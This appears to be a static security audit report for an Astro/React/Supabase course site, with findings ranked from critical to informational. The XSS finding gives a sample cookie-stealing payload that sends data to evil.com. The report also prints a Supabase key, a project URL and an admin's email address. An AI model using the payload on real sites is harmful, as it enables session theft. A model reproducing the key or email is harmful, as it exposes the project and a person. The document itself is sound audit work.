# Static Code Security Audit - CCNA_Lessons Project

**Project:** CCNA_Lessons (Astro v7 + React 19 + Supabase)
**Date:** 2026-08-05
**Scope:** Full source code static analysis across all `src/`, `supabase/migrations/`, config files

---

## Findings Summary

| Severity | Count | Key Findings |
|----------|-------|-------------|
| CRITICAL | 1 | Hardcoded Supabase credentials in 14+ files |
| HIGH | 6 | XSS via innerHTML (admin panel, logo), API keys in localStorage, incomplete signOut cleanup, unenforced feature flags, base64 avatars in DB |
| MEDIUM | 6 | No email verification enforcement, client-side admin auth, hardcoded admin email, no display_name validation, unused delete RPC, broad GRANT |
| LOW | 3 | Client-side-only password validation, hardcoded defaults, arbitrary point values |
| INFORMATIONAL | 3 | Clean npm audit, good RLS policies, dependency inventory |

**Total findings: 19**

---

### [CRITICAL] Supabase Anon Key Hardcoded in 14+ Page-Level Script Tags

**OWASP Category:** A07 - Identification and Authentication Failures
**File(s):**
- `src/pages/en/login.astro` (line 143)
- `src/pages/en/dashboard.astro` (line 232)
- `src/pages/en/profile.astro` (line 226)
- `src/pages/en/reset-password.astro` (line 122)
- `src/pages/en/pricing.astro` (line 189)
- `src/pages/en/lessons/[module]/quiz.astro` (line 91)
- `src/pages/en/lessons/[module]/[lesson].astro` (line 351)
- `src/pages/el/login.astro` (line 105)
- `src/pages/el/dashboard.astro` (line 180)
- `src/pages/el/profile.astro` (line 132)
- `src/pages/el/reset-password.astro` (line 72)
- `src/pages/el/pricing.astro` (line 97)
- `src/pages/el/lessons/[module]/quiz.astro` (line 164)
- `src/pages/el/lessons/[module]/[lesson].astro` (line 251)

**Description:** The Supabase project URL and anon key `sb_publishable_bKD9biIulcfC5iNipD-8IA_3Zu4bmWD` are hardcoded directly in inline `<script>` tags across 14+ page files, duplicating the same credential everywhere instead of using the centralized `src/lib/supabase.ts` or `src/lib/config.ts`.

**Evidence:**
```javascript
// Repeated in every page's <script> block:
const supabase = createClient(
  'https://jhesstimsojwmkdysmpy.supabase.co',
  'sb_publishable_bKD9biIulcfC5iNipD-8IA_3Zu4bmWD'
);
```

**Impact:** While the Supabase anon key is designed to be public, hardcoding it in 14+ files makes key rotation extremely difficult. Additionally, this pattern indicates the centralized client at `src/lib/supabase.ts` is not being used consistently.

**Remediation:** Remove all hardcoded `createClient()` calls from page-level scripts. All pages should import from the centralized `src/lib/supabase.ts`. If Astro inline scripts cannot import modules directly, use `define:vars` to pass environment variables.

---

### [HIGH] Stored XSS via innerHTML in Admin Panel User Table

**OWASP Category:** A03 - Injection
**File(s):**
- `src/pages/en/admin.astro` (lines 507-533)
- `src/pages/el/admin.astro` (lines 231+)

**Description:** The admin panel renders user data by interpolating user-controlled values (`display_name`, email) directly into HTML via `innerHTML` without any sanitization or escaping.

**Evidence:**
```javascript
tableBody.innerHTML = profiles.map(p => {
  const userEmail = emailMap[p.id] || p.email || p.id.substring(0, 8) + '...';
  return `<tr ...>
    <td>${p.display_name || 'User'}</td>      // XSS HERE
    <td>${userEmail}</td>                       // XSS HERE
    <button data-user-name="${p.display_name || 'User'}" ...> // XSS in attribute
  </tr>`;
}).join('');
```

**Impact:** Any registered user can set their `display_name` to a malicious payload like `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`. When an admin views the admin panel, the script executes in the admin's browser session, potentially stealing admin credentials.

**Remediation:** Use `textContent` instead of `innerHTML`, or escape all interpolated values before insertion using an `escapeHtml()` function.

---

### [HIGH] Stored XSS via innerHTML in Admin Logo Preview

**OWASP Category:** A03 - Injection
**File(s):** `src/pages/en/admin.astro` (line 795)

**Description:** The logo preview function injects a user-controlled URL directly into an innerHTML assignment with an `onerror` handler.

**Evidence:**
```javascript
preview.innerHTML = `<img src="${logoUrl}" alt="Logo" class="w-10 h-10 rounded-xl object-cover" onerror="this.parentElement.innerHTML='N'" />`;
```

**Remediation:** Use DOM APIs instead of innerHTML:
```javascript
const img = document.createElement('img');
img.src = logoUrl;
img.onerror = () => { preview.textContent = 'N'; };
preview.replaceChildren(img);
```

---

### [HIGH] API Keys and Secrets Stored in Plaintext localStorage

**OWASP Category:** A04 - Insecure Design
**File(s):**
- `src/pages/en/admin.astro` (lines 764, 774, 812)
- `src/lib/admin.ts` (line 53, 68)

**Description:** The admin settings panel stores highly sensitive credentials in `localStorage` as plaintext JSON, including Revolut API keys, webhook secrets, Supabase service role keys, Stripe secret keys, and SMTP passwords.

**Evidence:**
```javascript
localStorage.setItem('adminSettings', JSON.stringify({
  revolutApiKey: ...,           // Payment API key
  revolutWebhookSecret: ...,   // Webhook secret
  supabaseServiceKey: ...,     // Supabase SERVICE ROLE key
  stripeSecretKey: ...,        // Stripe SECRET key
  emailSmtpPass: ...,          // SMTP password
}));
```

**Impact:** Any XSS vulnerability can exfiltrate all these secrets with a single `localStorage.getItem('adminSettings')` call. This would give an attacker: payment processing capabilities, full database access, and email sending ability.

**Remediation:** Never store API secrets in localStorage. Move all secret storage server-side.

---

### [HIGH] signOut() Does Not Clear All Sensitive localStorage Keys

**OWASP Category:** A07 - Identification and Authentication Failures
**File(s):** `src/components/layout/Header.tsx` (lines 281-284, 344-346)

**Description:** When a user logs out, only `userEmail` and `userId` are removed from localStorage. Multiple other sensitive keys persist.

**Evidence:**
```typescript
await supabase.auth.signOut();
localStorage.removeItem('userEmail');
localStorage.removeItem('userId');
// MISSING: localStorage.removeItem('userAvatar');
// MISSING: localStorage.removeItem('completedLessons_*');
// MISSING: localStorage.removeItem('adminSettings');
```

**Impact:** After logout, the next user on the same browser can access: the previous user's email, user ID, full base64 avatar image, all learning progress, and if admin, all API keys.

**Remediation:** Clear all user-specific localStorage keys on signOut.

---

### [HIGH] Feature Flags Defined But Never Enforced

**OWASP Category:** A04 - Insecure Design
**File(s):** `src/lib/config.ts` (lines 34-37)

**Description:** Feature flags `ENABLE_REGISTRATION`, `ENABLE_PASSWORD_RESET`, `ENABLE_GOOGLE_OAUTH`, and `MAINTENANCE_MODE` are defined in config.ts but are never imported or checked anywhere in the codebase.

**Impact:** An admin who disables registration via the admin panel believes it is enforced, but it is not. Users can still register. Google OAuth remains clickable even when disabled.

**Remediation:** Each page that uses these flags must import and check them before rendering protected UI.

---

### [HIGH] Avatar Stored as Base64 in Database Column

**OWASP Category:** A04 - Insecure Design
**File(s):** `src/pages/en/profile.astro` (lines 325-350)

**Description:** User avatars are converted to base64 data URLs and stored directly in the `profiles.avatar_url` column. Every query to `profiles` returns the full base64 string.

**Impact:** A 2MB image becomes ~2.7MB as base64. The admin panel loads ALL profiles including all base64 avatars. This creates massive payload sizes and excessive database storage costs.

**Remediation:** Use Supabase Storage for file uploads and store only the public URL in the database.

---

### [MEDIUM] No Email Verification Enforcement After Signup

**OWASP Category:** A07 - Identification and Authentication Failures
**File(s):** `src/pages/en/login.astro` (lines 260-284)

**Description:** After signup, the user is immediately redirected to the dashboard without checking if the email has been verified.

**Remediation:** Check `data.user?.email_confirmed_at` before granting access. Show a "please verify your email" page instead.

---

### [MEDIUM] Client-Side Admin Authorization with DOM-Based Access Control

**OWASP Category:** A01 - Broken Access Control
**File(s):** `src/pages/en/admin.astro` (lines 27, 421-441)

**Description:** The admin page renders all admin content in the HTML and uses CSS classes (`hidden`) to show/hide it based on JavaScript authorization checks. The full admin HTML is delivered to every visitor.

**Remediation:** Move admin authorization to middleware or server-side rendering.

---

### [MEDIUM] Admin Panel Hardcoded Admin Email in Multiple Locations

**OWASP Category:** A07 - Identification and Authentication Failures
**File(s):**
- `src/lib/admin.ts` (line 2)
- `src/pages/en/login.astro` (line 146)
- `src/pages/en/admin.astro` (line 38)
- `src/pages/el/admin.astro` (line 35)

**Description:** The admin email `tsiartasantreas@gmail.com` is hardcoded in 4+ locations.

**Remediation:** Remove all hardcoded admin email references. Admin status should be determined exclusively by the `profiles.is_admin` database column.

---

### [MEDIUM] Display Name Input Has No Validation or Length Limits

**OWASP Category:** A03 - Injection
**File(s):** `src/pages/en/profile.astro` (lines 470-474)

**Description:** The profile form updates `display_name` directly from the input field value with no client-side or server-side validation.

**Impact:** A user could set an extremely long display name or inject HTML/JavaScript content that executes in the admin panel via innerHTML.

**Remediation:** Add client-side validation (max 50 chars) and a database CHECK constraint.

---

### [MEDIUM] Account Deletion Does Not Use the Database RPC Function

**OWASP Category:** A04 - Insecure Design
**File(s):** `src/pages/en/profile.astro` (lines 439-453)

**Description:** A proper `delete_user_account` RPC function exists but is never called. The profile page performs individual table deletes instead.

**Impact:** The user's auth account (`auth.users` record) is never deleted, meaning the email remains registered.

**Remediation:** Replace individual deletes with `supabase.rpc('delete_user_account', { target_user_id: session.user.id })`.

---

### [MEDIUM] `delete_user_account` RPC Grants Access to All Authenticated Users

**OWASP Category:** A01 - Broken Access Control
**File(s):** `supabase/migrations/006_delete_account.sql` (line 23)

**Description:** The function is granted to the `authenticated` role, meaning any logged-in user can call it. While internal checks prevent deleting other users, the broad grant increases attack surface.

---

### [LOW] Password Validation Is Client-Side Only

**OWASP Category:** A07 - Identification and Authentication Failures
**File(s):** `src/pages/en/login.astro` (lines 218-225)

**Description:** Password strength validation is performed only in JavaScript. Supabase Auth provides a server-side safety net with minimum length requirement.

**Remediation:** Configure Supabase Auth password policy to enforce complexity requirements server-side.

---

### [LOW] Admin Settings Reinitialized with Hardcoded Defaults

**OWASP Category:** A04 - Insecure Design
**File(s):** `src/lib/admin.ts` (lines 30-49)

**Description:** The `defaultSettings` object contains a hardcoded Supabase URL. When localStorage is empty, these defaults are returned.

**Remediation:** Import the URL from `config.ts` instead of hardcoding it.

---

### [LOW] `increment_points` RPC Accepts Arbitrary Point Values from Client

**OWASP Category:** A04 - Insecure Design
**File(s):** `src/lib/auth.ts` (lines 162-166)

**Description:** While the RPC correctly validates that `auth.uid() == p_user_id`, it accepts any arbitrary `p_points` value from the client.

**Remediation:** Move point calculation to a server-side function or add a maximum points-per-day cap.

---

### [INFORMATIONAL] npm Audit Shows Zero Vulnerabilities

**Description:** `npm audit` returned 0 vulnerabilities. Dependencies are current.

---

### [INFORMATIONAL] RLS Policies Are Well-Structured

**Description:** All 5 tables have RLS enabled. Policies use `auth.uid()` checks for user-scoped access and the `is_admin()` SECURITY DEFINER function for admin access. No overly permissive policies found.

---

### [INFORMATIONAL] Dependency Inventory

| Package | Version | Risk Notes |
|---------|---------|------------|
| @supabase/supabase-js | ^2.112.0 | Core auth/database client |
| jspdf | ^4.2.1 | PDF generation - client side only |
| qrcode.react | ^4.2.0 | QR code rendering |
| @react-three/fiber + drei | ^9.7.0 / ^10.7.7 | 3D rendering |
| three | ^0.185.1 | 3D engine |
| astro | ^7.1.6 | Framework |
| tailwindcss | ^4.3.3 | CSS framework |

No known vulnerabilities.
